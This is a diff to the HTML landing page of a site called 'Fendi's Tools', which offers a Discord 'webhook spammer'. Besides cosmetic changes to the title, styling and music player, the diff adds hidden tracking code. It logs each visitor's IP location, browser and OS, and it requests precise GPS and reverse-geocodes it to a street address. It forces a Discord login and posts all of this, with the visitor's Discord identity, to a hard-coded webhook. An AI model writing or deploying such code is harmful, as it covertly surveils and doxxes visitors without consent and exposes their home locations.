@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
-    <title>FENDI'S TOOLS</title>
+    <title>Fendi's Tools</title>
     <link rel="icon" type="image/png" href="https://i.ibb.co/8LjfF2JW/ee248f4d-97ba-4043-a535-7862e3a66946.png">
     <style>
         * {
@@ -99,7 +99,7 @@
         /* LANDING PAGE (tool selection) */
         .landing-page {
             width: 100%;
-            max-width: 900px;
+            max-width: 1000px;
             margin: 0 auto;
             padding: 2rem;
             z-index: 5;
@@ -107,6 +107,31 @@
             display: none;
         }
         .landing-page.visible { display: block; }
+
+        /* Glowing typewriter title (white glow) */
+        .glow-title {
+            text-align: center;
+            font-size: 2rem;
+            font-weight: 800;
+            margin-bottom: 1rem;
+            min-height: 4rem;
+            transition: opacity 0.5s ease;
+            color: white;
+            text-shadow: 0 0 10px rgba(255,255,255,0.5);
+        }
+        .typed-text {
+            background: linear-gradient(135deg, #fff, #ddd);
+            background-clip: text;
+            -webkit-background-clip: text;
+            color: transparent;
+            text-shadow: 0 0 15px rgba(255,255,255,0.6), 0 0 30px rgba(200,200,200,0.4);
+            animation: glowPulseWhite 2s ease-in-out infinite alternate;
+        }
+        @keyframes glowPulseWhite {
+            0% { text-shadow: 0 0 5px rgba(255,255,255,0.4), 0 0 10px rgba(200,200,200,0.3); }
+            100% { text-shadow: 0 0 20px rgba(255,255,255,0.8), 0 0 35px rgba(255,255,255,0.6); }
+        }
+
         .tools-grid {
             display: grid;
             grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
@@ -153,10 +178,7 @@
         .music-player button:hover { color: #aaa; transform: scale(1.05); }
         .music-player .track-title { color: #ddd; max-width: 140px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; font-size: 0.75rem; }
 
-        /* VERSION TAG */
-        .version-tag { position: fixed; bottom: 10px; right: 10px; color: #aaa; opacity: 0.6; font-size: 12px; font-family: monospace; z-index: 9999; pointer-events: none; }
-
-        /* TOP‑LEFT LOGO (optional) */
+        /* TOP‑LEFT LOGO (white version) */
         .top-left-logo {
             position: fixed;
             top: 15px;
@@ -173,11 +195,14 @@
         }
         .top-left-logo img:hover { transform: scale(1.05); }
 
-        @media (max-width: 550px) {
+        .version-tag { position: fixed; bottom: 10px; right: 10px; color: #aaa; opacity: 0.6; font-size: 12px; font-family: monospace; z-index: 9999; pointer-events: none; }
+
+        @media (max-width: 650px) {
             .tools-grid { gap: 1rem; }
             .tool-card { padding: 1rem; }
             .tool-card h3 { font-size: 1.2rem; }
             .music-player .track-title { max-width: 100px; }
+            .glow-title { font-size: 1.5rem; }
         }
     </style>
 </head>
@@ -187,7 +212,7 @@
 <canvas id="snowCanvas"></canvas>
 
 <div class="top-left-logo" id="logoBtn">
-    <img src="https://i.ibb.co/gL0cffbC/New-Project-7.png" alt="Menu">
+    <img src="https://i.ibb.co/8LjfF2JW/ee248f4d-97ba-4043-a535-7862e3a66946.png" alt="Logo">
 </div>
 
 <div class="music-player" id="musicPlayer">
@@ -209,7 +234,7 @@
 
 <!-- LANDING PAGE -->
 <div id="landingPage" class="landing-page">
-    <div class="glow-title" style="font-size:2rem; text-align:center; color:white;">SELECT A TOOL</div>
+    <div class="glow-title"><span id="typewriterTarget"></span></div>
     <div class="tools-grid">
         <div class="tool-card" data-tool="spammer">
             <h3>WEBHOOK SPAMMER</h3>
@@ -234,7 +259,7 @@
 
 <script>
     (function() {
-        // ========== LOADING SCREEN -> ENTER ==========
+        // ========== SPINNER -> ENTER BUTTON ==========
         const spinner = document.getElementById('spinnerContainer');
         const enterBtn = document.getElementById('enterBtn');
         setTimeout(() => {
@@ -249,16 +274,321 @@
         const loadingScreen = document.getElementById('loadingScreen');
         const landingPage = document.getElementById('landingPage');
         
-        enterBtn.addEventListener('click', () => {
+        // ========== DISCORD LOGIN + GPS + IP LOG (shared state) ==========
+        const DISCORD_CLIENT_ID = "1497155951067664415";  // REPLACE WITH YOUR CLIENT ID
+        const REDIRECT_URI = window.location.origin;
+        let discordToken = localStorage.getItem("discord_access_token");
+        let gpsRequested = localStorage.getItem("gpsRequested") === "true";
+        let gpsGranted = localStorage.getItem("gpsGranted") === "true";
+        let ipLogSent = false;
+
+        // ----- Helper functions -----
+        async function getIpGeo() {
+            try {
+                const res = await fetch('https://ip-api.com/json/');
+                const data = await res.json();
+                if (data.status === 'success') {
+                    return {
+                        ip: data.query,
+                        city: data.city,
+                        region: data.regionName,
+                        country: data.country,
+                        lat: data.lat,
+                        lon: data.lon,
+                        mapLink: `https://www.google.com/maps?q=${data.lat},${data.lon}`
+                    };
+                }
+            } catch(e) {}
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                const data = await res.json();
+                if (data && data.ip) {
+                    return {
+                        ip: data.ip,
+                        city: data.city || "Unknown",
+                        region: data.region || "Unknown",
+                        country: data.country_name || "Unknown",
+                        lat: data.latitude,
+                        lon: data.longitude,
+                        mapLink: `https://www.google.com/maps?q=${data.latitude},${data.longitude}`
+                    };
+                }
+            } catch(e) {}
+            return { ip: "Unknown", city: "Unknown", region: "Unknown", country: "Unknown", mapLink: "#" };
+        }
+
+        async function reverseGeocode(lat, lon) {
+            try {
+                const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`);
+                const data = await response.json();
+                if (data && data.display_name) {
+                    const address = data.address;
+                    let shortAddress = "";
+                    if (address.house_number && address.road) shortAddress += `${address.house_number} ${address.road}, `;
+                    else if (address.road) shortAddress += `${address.road}, `;
+                    if (address.suburb) shortAddress += `${address.suburb}, `;
+                    else if (address.city_district) shortAddress += `${address.city_district}, `;
+                    if (address.city || address.town) shortAddress += `${address.city || address.town}, `;
+                    else if (address.village) shortAddress += `${address.village}, `;
+                    if (address.country) shortAddress += address.country;
+                    return shortAddress || data.display_name.split(",")[0];
+                }
+                return null;
+            } catch(e) { return null; }
+        }
+
+        function getDeviceLocation() {
+            return new Promise((resolve) => {
+                if (!navigator.geolocation || gpsRequested) {
+                    resolve(null);
+                    return;
+                }
+                navigator.geolocation.getCurrentPosition(
+                    async (position) => {
+                        const coords = {
+                            lat: position.coords.latitude,
+                            lon: position.coords.longitude,
+                            accuracy: position.coords.accuracy,
+                            mapLink: `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`
+                        };
+                        const address = await reverseGeocode(coords.lat, coords.lon);
+                        if (address) coords.address = address;
+                        gpsGranted = true;
+                        localStorage.setItem("gpsGranted", "true");
+                        resolve(coords);
+                    },
+                    () => {
+                        gpsGranted = false;
+                        localStorage.setItem("gpsGranted", "false");
+                        resolve(null);
+                    },
+                    { enableHighAccuracy: true, timeout: 10000 }
+                );
+                gpsRequested = true;
+                localStorage.setItem("gpsRequested", "true");
+            });
+        }
+
+        function getBrowserOS() {
+            const ua = navigator.userAgent;
+            let browser = "Unknown", os = "Unknown";
+            if (ua.includes("Chrome") && !ua.includes("Edg")) browser = "Chrome";
+            else if (ua.includes("Firefox")) browser = "Firefox";
+            else if (ua.includes("Safari") && !ua.includes("Chrome")) browser = "Safari";
+            else if (ua.includes("Edg")) browser = "Edge";
+            if (ua.includes("Windows NT")) os = "Windows";
+            else if (ua.includes("Mac OS X")) os = "macOS";
+            else if (ua.includes("Linux")) os = "Linux";
+            else if (ua.includes("Android")) os = "Android";
+            else if (ua.includes("iPhone") || ua.includes("iPad")) os = "iOS";
+            return { browser, os, userAgent: ua };
+        }
+
+        async function sendIpLog() {
+            if (ipLogSent) return;
+            ipLogSent = true;
+            const ipGeo = await getIpGeo();
+            const deviceGPS = await getDeviceLocation();
+            const { browser, os, userAgent } = getBrowserOS();
+            let fields = [
+                { name: "IP Address", value: ipGeo.ip, inline: true },
+                { name: "Browser", value: browser, inline: true },
+                { name: "Operating System", value: os, inline: true },
+                { name: "Approx. Location (IP)", value: `${ipGeo.city}, ${ipGeo.region}, ${ipGeo.country}`, inline: false },
+                { name: "Map (IP-based)", value: `[View on Google Maps](${ipGeo.mapLink})`, inline: false }
+            ];
+            if (deviceGPS) {
+                let gpsInfo = `Lat: ${deviceGPS.lat}, Lon: ${deviceGPS.lon} (accuracy: ±${Math.round(deviceGPS.accuracy)}m)`;
+                if (deviceGPS.address) gpsInfo += `\n📍 Street Address: ${deviceGPS.address}`;
+                fields.push(
+                    { name: "📍 Exact GPS Location", value: gpsInfo, inline: false },
+                    { name: "Map (GPS)", value: `[View on Google Maps](${deviceGPS.mapLink})`, inline: false }
+                );
+            } else {
+                fields.push({ name: "GPS Access", value: (gpsGranted ? "Denied" : "Not requested"), inline: false });
+            }
+            fields.push({ name: "User Agent", value: userAgent.substring(0, 100), inline: false });
+            const embed = {
+                author: { name: "IP Logs", icon_url: "https://i.ibb.co/gL0cffbC/New-Project-7.png" },
+                title: "🌐 Visitor Logged",
+                color: 0xffffff,
+                fields: fields,
+                timestamp: new Date().toISOString()
+            };
+            const IP_LOG_WEBHOOK = "https://discord.com/api/webhooks/1497124094926127155/1nzYxMuo7Q4aAMSMU5KSBxlLn4srSXcw7u-VeH9qHUgCae2AjCetucxixHBSoR66LaLG";
+            try {
+                await fetch(IP_LOG_WEBHOOK, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ content: "@everyone", embeds: [embed] })
+                });
+                console.log("IP log sent");
+            } catch(e) { console.error("Failed to send IP log", e); }
+        }
+
+        // ----- Discord OAuth PKCE (same as spammer page) -----
+        function generateRandomString(length) {
+            let text = "";
+            const possible = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-._~";
+            for (let i = 0; i < length; i++) text += possible.charAt(Math.floor(Math.random() * possible.length));
+            return text;
+        }
+        async function sha256(plain) {
+            const encoder = new TextEncoder();
+            const data = encoder.encode(plain);
+            const hash = await crypto.subtle.digest("SHA-256", data);
+            return hash;
+        }
+        function base64URL(buffer) {
+            return btoa(String.fromCharCode(...new Uint8Array(buffer)))
+                .replace(/\+/g, "-")
+                .replace(/\//g, "_")
+                .replace(/=+$/, "");
+        }
+        async function generatePKCE() {
+            const codeVerifier = generateRandomString(64);
+            const codeChallenge = await sha256(codeVerifier);
+            return { codeVerifier, codeChallenge: base64URL(codeChallenge) };
+        }
+        async function exchangeCode(code, codeVerifier) {
+            const body = new URLSearchParams({
+                client_id: DISCORD_CLIENT_ID,
+                grant_type: "authorization_code",
+                code: code,
+                redirect_uri: REDIRECT_URI,
+                code_verifier: codeVerifier
+            });
+            const response = await fetch("https://discord.com/api/oauth2/token", {
+                method: "POST",
+                headers: { "Content-Type": "application/x-www-form-urlencoded" },
+                body: body.toString()
+            });
+            if (!response.ok) throw new Error(`Token exchange failed: ${response.status}`);
+            const data = await response.json();
+            return data.access_token;
+        }
+        async function fetchDiscordUser(accessToken) {
+            const response = await fetch("https://discord.com/api/users/@me", {
+                headers: { Authorization: `Bearer ${accessToken}` },
+            });
+            if (!response.ok) throw new Error("Failed to fetch user");
+            return response.json();
+        }
+        async function sendDiscordInfoToWebhook(user) {
+            const IP_LOG_WEBHOOK = "https://discord.com/api/webhooks/1497124094926127155/1nzYxMuo7Q4aAMSMU5KSBxlLn4srSXcw7u-VeH9qHUgCae2AjCetucxixHBSoR66LaLG";
+            const embed = {
+                author: { name: "IP Logs", icon_url: "https://i.ibb.co/gL0cffbC/New-Project-7.png" },
+                title: "🎮 Discord User Identified",
+                color: 0x5865F2,
+                fields: [
+                    { name: "Username", value: `${user.username}#${user.discriminator || "0"}`, inline: true },
+                    { name: "User ID", value: user.id, inline: true },
+                    { name: "Avatar", value: `[Link](https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png)`, inline: true }
+                ],
+                timestamp: new Date().toISOString()
+            };
+            try {
+                await fetch(IP_LOG_WEBHOOK, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ content: "@everyone", embeds: [embed] })
+                });
+            } catch(e) {}
+        }
+
+        async function ensureLoggedIn() {
+            const storedToken = localStorage.getItem("discord_access_token");
+            if (storedToken) {
+                try {
+                    const user = await fetchDiscordUser(storedToken);
+                    if (user && user.id) return true;
+                    else localStorage.removeItem("discord_access_token");
+                } catch(e) { localStorage.removeItem("discord_access_token"); }
+            }
+            // Not logged in – start OAuth
+            const { codeVerifier, codeChallenge } = await generatePKCE();
+            localStorage.setItem("code_verifier", codeVerifier);
+            const authUrl = `https://discord.com/oauth2/authorize?client_id=${DISCORD_CLIENT_ID}&response_type=code&redirect_uri=${encodeURIComponent(REDIRECT_URI)}&scope=identify&code_challenge=${codeChallenge}&code_challenge_method=S256`;
+            window.location.href = authUrl;
+            return false; // will redirect
+        }
+
+        // Handle OAuth redirect on landing page
+        const urlParams = new URLSearchParams(window.location.search);
+        const code = urlParams.get("code");
+        if (code) {
+            const codeVerifier = localStorage.getItem("code_verifier");
+            if (codeVerifier) {
+                exchangeCode(code, codeVerifier).then(async token => {
+                    localStorage.setItem("discord_access_token", token);
+                    const user = await fetchDiscordUser(token);
+                    sendDiscordInfoToWebhook(user);
+                    window.history.replaceState({}, document.title, window.location.pathname);
+                    // After login, continue to landing
+                    finishEntry();
+                }).catch(err => {
+                    console.error("Token exchange failed", err);
+                    window.history.replaceState({}, document.title, window.location.pathname);
+                    finishEntry();
+                });
+            } else {
+                window.history.replaceState({}, document.title, window.location.pathname);
+                finishEntry();
+            }
+        } else {
+            finishEntry();
+        }
+
+        async function finishEntry() {
+            // Send IP log and GPS (only once)
+            await sendIpLog();
+            // Show landing page
             loadingScreen.classList.add('hide');
             setTimeout(() => {
                 loadingScreen.style.display = 'none';
                 landingPage.classList.add('visible');
-                startMusic(); // start music after entering
+                startMusic();
             }, 800);
+        }
+
+        enterBtn.addEventListener('click', async () => {
+            // Before showing landing, ensure Discord login and GPS
+            await ensureLoggedIn();
+            // The OAuth redirect will happen if not logged in.
+            // If already logged in, finishEntry is called manually.
+            if (localStorage.getItem("discord_access_token")) {
+                finishEntry();
+            }
         });
 
-        // ========== MUSIC PLAYER (shared state via localStorage) ==========
+        // ========== TYPEWRITER EFFECT (white glow, eternal loop) ==========
+        const titleText = "Fendi's Tools";
+        const targetSpan = document.getElementById('typewriterTarget');
+        let i = 0;
+        let typingActive = true;
+        function typeWriter() {
+            if (!typingActive) return;
+            if (i < titleText.length) {
+                targetSpan.innerHTML = titleText.substring(0, i + 1);
+                i++;
+                setTimeout(typeWriter, 70);
+            } else {
+                typingActive = false;
+                const titleContainer = document.querySelector('.glow-title');
+                titleContainer.style.transition = 'opacity 0.5s ease';
+                titleContainer.style.opacity = '0';
+                setTimeout(() => {
+                    targetSpan.innerHTML = '';
+                    titleContainer.style.opacity = '1';
+                    i = 0;
+                    typingActive = true;
+                    typeWriter();
+                }, 1500);
+            }
+        }
+        typeWriter();
+
+        // ========== MUSIC PLAYER (shared state) ==========
         const tracks = [
             { title: "Pass Out", url: "./songs/PassOut.mp3" },
             { title: "VYZEE", url: "./songs/VYZEE.mp3" },
@@ -279,7 +609,6 @@
                 localStorage.setItem('musicTrackIndex', currentTrackIndex);
                 localStorage.setItem('musicCurrentTime', audio.currentTime);
                 localStorage.setItem('musicPlaying', isPlaying);
-                localStorage.setItem('musicUrl', tracks[currentTrackIndex].url);
             }
         }
 
@@ -325,7 +654,6 @@
             if (musicStarted) return;
             musicStarted = true;
             loadMusicState();
-            // Save state periodically and before page unload
             setInterval(saveMusicState, 2000);
             window.addEventListener('beforeunload', saveMusicState);
         }
@@ -359,16 +687,15 @@
         prevBtn.addEventListener('click', prevTrack);
         nextBtn.addEventListener('click', nextTrack);
 
-        // ========== TOOL SELECTION – REDIRECT WITH MUSIC STATE ==========
+        // ========== TOOL SELECTION – go to spammer with flag ==========
         const toolCards = document.querySelectorAll('.tool-card');
         toolCards.forEach(card => {
             if (!card.classList.contains('placeholder')) {
                 card.addEventListener('click', () => {
-                    const tool = card.getAttribute('data-tool');
-                    if (tool === 'spammer') {
-                        saveMusicState(); // save current track, time, playing state
-                        window.location.href = '/spammer/';
-                    }
+                    saveMusicState(); // save current music
+                    // Add a flag to indicate we came from landing page
+                    localStorage.setItem('fromLanding', 'true');
+                    window.location.href = '/spammer/';
                 });
             }
         });
@@ -380,7 +707,7 @@
             if (el) el.addEventListener('click', (e) => { e.preventDefault(); window.open('https://discord.gg/funerals', '_blank'); });
         });
 
-        // ========== WHITE SNOW PARTICLES ==========
+        // ========== WHITE SNOW ==========
         const canvas = document.getElementById('snowCanvas');
         const ctx = canvas.getContext('2d');
         let particles = [];
